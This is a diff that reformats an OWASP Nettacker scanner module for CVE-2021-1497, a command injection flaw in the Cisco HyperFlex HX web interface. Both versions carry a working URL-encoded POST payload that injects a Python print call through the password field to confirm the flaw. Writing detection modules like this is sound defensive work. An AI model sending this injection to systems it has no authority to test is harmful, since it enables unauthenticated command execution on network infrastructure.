@@ -2,52 +2,53 @@ info:
   name: cisco_hyperflex_cve_2021_1497_vuln
   author: OWASP Nettacker Team
   severity: 9.8
-  description: Multiple vulnerabilities in the web-based management interface of Cisco HyperFlex HX could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
+  description: Multiple vulnerabilities in the web-based management interface of Cisco
+    HyperFlex HX could allow an unauthenticated, remote attacker to perform command
+    injection attacks against an affected device.
   reference:
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-1497
-    - https://packetstormsecurity.com/files/162976/Cisco-HyperFlex-HX-Data-Platform-Command-Execution.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-1497
+  - https://packetstormsecurity.com/files/162976/Cisco-HyperFlex-HX-Data-Platform-Command-Execution.html
   profiles:
-    - vuln
-    - http
-    - high_severity
-    - cve
-    - hyperflex
-    - cisco
-
+  - vuln
+  - http
+  - high_severity
+  - hyperflex
+  - cisco
+  - cve_2021
 payloads:
-  - library: http
-    steps:
-      - method: post
-        timeout: 3
-        headers:
-          Accept: "*/*"
-          Content-Type: application/x-www-form-urlencoded
-          User-Agent: "{user_agent}"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              paths:
-                - 'auth/change'
-                - 'auth'
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-        data: username=root&password=123%5C%22%2C%5C%22%246%24%24%5C%22%29%29%3Bprint%28%22%5Cx6e%5Cx65%5Cx74%5Cx74%5Cx61%5Cx63%5Cx6b%5Cx65%5Cx72%22%29%3Bprint%28crypt.crypt%28%5C%22
-        response:
-          condition_type: and
-          conditions:
-            status_code:
-              regex: "200"
-              reverse: false
-            content:
-              regex: "nettacker"
-              reverse: false
+- library: http
+  steps:
+  - method: post
+    timeout: 3
+    headers:
+      Accept: '*/*'
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: '{user_agent}'
+    allow_redirects: false
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/{{paths}}'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          paths:
+          - auth/change
+          - auth
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+    data: username=root&password=123%5C%22%2C%5C%22%246%24%24%5C%22%29%29%3Bprint%28%22%5Cx6e%5Cx65%5Cx74%5Cx74%5Cx61%5Cx63%5Cx6b%5Cx65%5Cx72%22%29%3Bprint%28crypt.crypt%28%5C%22
+    response:
+      condition_type: and
+      conditions:
+        status_code:
+          regex: '200'
+          reverse: false
+        content:
+          regex: nettacker
+          reverse: false
